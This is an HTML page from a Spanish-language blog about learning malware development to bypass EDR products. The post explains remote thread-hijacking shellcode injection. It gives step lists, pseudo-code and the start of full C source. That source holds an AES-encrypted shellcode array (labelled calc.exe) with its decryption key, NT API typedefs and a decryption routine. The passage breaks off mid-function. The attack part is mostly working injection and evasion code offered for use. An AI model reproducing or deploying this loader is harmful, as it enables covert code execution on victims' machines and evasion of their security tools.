<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup theme-color -->
<!-- start theme color meta headers -->
<meta name="theme-color" content="#151515">
<meta name="msapplication-navbutton-color" content="#151515">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- end theme color meta headers -->


<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Bypaseando mis limitaciones | El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Bypaseando mis limitaciones" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR" />
<meta property="og:description" content="El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR" />
<link rel="canonical" href="http://localhost:4000/external_process_thread_injection.html" />
<meta property="og:url" content="http://localhost:4000/external_process_thread_injection.html" />
<meta property="og:site_name" content="Bypaseando mis limitaciones" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Bypaseando mis limitaciones" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR","headline":"Bypaseando mis limitaciones","url":"http://localhost:4000/external_process_thread_injection.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>Bypaseando mis limitaciones</h1>
        </a>
        <h2>El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR</h2>

        <section id="downloads">
          
            <a href="" class="btn">Download as .zip</a>
            <a href="" class="btn">Download as .tar.gz</a>
          
          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <h1 id="inyección-en-hilo-del-proceso-externo">Inyección en hilo del proceso externo</h1>

<p>Otro mecanisomo utilizado se trata de una técnica más avanzada de la inyección de shellcode en un proceso externo.
En este caso el método tiene las siguientes estapas:</p>
<ul>
  <li>Localizar el proceso remoto en el que tengamos privilegios de escritura y ejecución</li>
  <li>Reservar memoria en la que se elojará nuestro payload en el mapa de meoria del proceso remoto</li>
  <li>Escribir el shellcode en el buffer de la memoria reservada</li>
  <li>Realizar un “hijacking” o secuestro de un hilo de ejecución del proceso remoto, modificar su contexto y hacer que apunte a la zona de memoria en la que se alojó el shellcode por el proceso molicioso.</li>
</ul>

<p>De este modo conseguiremos que el proceso remoto mediante su hilo, realice la ejecución del payload por si mismo.
Es cierto que si la ejecución del hilo es importante para el correcto funcionamiento dle proceso, es posible que este haga crash o se cierre tras la ejecución de nuestro payload.</p>

<h2 id="diagrama-de-flujo-de-la-ejecución">Diagrama de flujo de la ejecución</h2>

<p><img src="/assets/images/remote_thread_context.png" alt="Remote process Thread Context " /></p>

<h2 id="pseudo-codigo-de-la-ejecución">Pseudo-codigo de la ejecución</h2>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 1.se busca el proceso externo y se obtiene el Id posteriormente se obtiene el thread que se quiere secuestrar</span>
<span class="n">hRemoteProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,...,</span> <span class="n">RemoteProcessID</span><span class="p">)</span>
<span class="n">hThread</span> <span class="o">=</span> <span class="n">OpenThread</span><span class="p">(</span><span class="n">THREAD_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">ThreadID</span><span class="p">)</span>

<span class="c1">// 2. Se reserva el espacio de memoria asociado al shellcode en el proceso remoto</span>
<span class="n">pRemoteCode</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hRemoteProcess</span><span class="p">,...,</span> <span class="n">BufferSize</span><span class="p">,...,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">)</span>

<span class="c1">// 3. Se ecribe el shellcode en el buffer</span>
<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hRemoteProcess</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="n">Shellcode</span><span class="p">,</span> <span class="n">ShellcodeSize</span><span class="p">,...)</span>

<span class="c1">// 4. Se suspende el hilo del proceso remoto secuestrado y se obtiene el contexto</span>
<span class="n">CONTEXT</span> <span class="n">ctx</span>
<span class="n">ctx</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_FULL</span>
<span class="n">SuspendThread</span><span class="p">(</span><span class="n">hThread</span><span class="p">)</span>
<span class="n">GetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">)</span>

<span class="c1">// 5. Se apunta el siguiente registro a ejecutar Rip en 64 bits a la posicion de memoria en la que se encuentra nuestro shellcode</span>
<span class="n">ctx</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="n">pRemoteCode</span>      <span class="c1">// 64-bit process</span>

<span class="c1">// 6. se actualiza el contexto del thread y se le permite continuar</span>
<span class="n">SetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">)</span>
<span class="n">ResumeThread</span><span class="p">(</span><span class="n">hThread</span><span class="p">)</span>
</code></pre></div></div>
<p>La manipulación de los hilos de un proceso se realiza mediante el uso del objeto con la siguiente estructura: THREADENTRY32</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">tagTHREADENTRY32</span> <span class="p">{</span>
  <span class="n">DWORD</span> <span class="n">dwSize</span><span class="p">;</span>			<span class="c1">// Tamaño en bytes de la estructura</span>
  <span class="n">DWORD</span> <span class="n">cntUsage</span><span class="p">;</span>		<span class="c1">// En desuso, valor simepre a 0</span>
  <span class="n">DWORD</span> <span class="n">th32ThreadID</span><span class="p">;</span>		<span class="c1">// Identificador del hilo</span>
  <span class="n">DWORD</span> <span class="n">th32OwnerProcessID</span><span class="p">;</span>	<span class="c1">// PID del proceso al que pertenece el hilo</span>
  <span class="n">LONG</span>  <span class="n">tpBasePri</span><span class="p">;</span>		<span class="c1">// Prioridad de ejecución del hilo un valor entre 1 - 32</span>
  <span class="n">LONG</span>  <span class="n">tpDeltaPri</span><span class="p">;</span>		<span class="c1">// En desuso, valor simepre a 0</span>
  <span class="n">DWORD</span> <span class="n">dwFlags</span><span class="p">;</span>		<span class="c1">// En desuso, valor simepre a 0</span>
<span class="p">}</span> <span class="n">THREADENTRY32</span><span class="p">,</span> <span class="o">*</span><span class="n">PTHREADENTRY32</span><span class="p">;</span>
</code></pre></div></div>

<h2 id="exe-código-fuente">EXE Código fuente</h2>

<p>Es Importante la función Injection en la que se puede validar como se obtiene:</p>
<ul>
  <li>Posicion de memoria donde se encuentra el buffer almacenado</li>
  <li>Posición de memoria del registro Rid en el momento en el que el hilo se suspende</li>
  <li>Actualización del registro Rid en el contexto del hilo</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wincrypt.h&gt;</span><span class="cp">
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
</span>
<span class="c1">// calc.exe</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x8f</span> <span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xc3</span> <span class="p">};</span>

<span class="c1">// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_CLIENT_ID</span> <span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">UniqueProcess</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">UniqueThread</span><span class="p">;</span>
<span class="p">}</span> <span class="n">CLIENT_ID</span><span class="p">,</span> <span class="o">*</span><span class="n">PCLIENT_ID</span><span class="p">;</span>

<span class="k">typedef</span> <span class="nf">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">VirtualAlloc_t</span><span class="p">)(</span>
	<span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
	<span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flProtect</span><span class="p">);</span>
	
<span class="k">typedef</span> <span class="nf">VOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlMoveMemory_t</span><span class="p">)(</span>
	<span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Destination</span><span class="p">,</span> 
	<span class="k">const</span> <span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Source</span><span class="p">,</span> 
	<span class="n">SIZE_T</span> <span class="n">Length</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">FARPROC</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlCreateUserThread_t</span><span class="p">)(</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PSECURITY_DESCRIPTOR</span> <span class="n">SecurityDescriptor</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">BOOLEAN</span> <span class="n">CreateSuspended</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackReserved</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartParameter</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">ThreadHandle</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PCLIENT_ID</span> <span class="n">ClientId</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">NTSTATUS</span> <span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span> <span class="n">NtCreateThreadEx_t</span><span class="p">)(</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">hThread</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ACCESS_MASK</span> <span class="n">DesiredAccess</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">ObjectAttributes</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpStartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackReserve</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PVOID</span> <span class="n">lpBytesBuffer</span><span class="p">);</span>


<span class="kt">int</span> <span class="nf">AESDecrypt</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">keylen</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">HCRYPTPROV</span> <span class="n">hProv</span><span class="p">;</span>
	<span class="n">HCRYPTHASH</span> <span class="n">hHash</span><span class="p">;</span>
	<span class="n">HCRYPTKEY</span> <span class="n">hKey</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptAcquireContextW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PROV_RSA_AES</span><span class="p">,</span> <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptCreateHash</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_SHA_256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hHash</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptHashData</span><span class="p">(</span><span class="n">hHash</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">keylen</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>              
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDeriveKey</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_AES_256</span><span class="p">,</span> <span class="n">hHash</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">hKey</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	
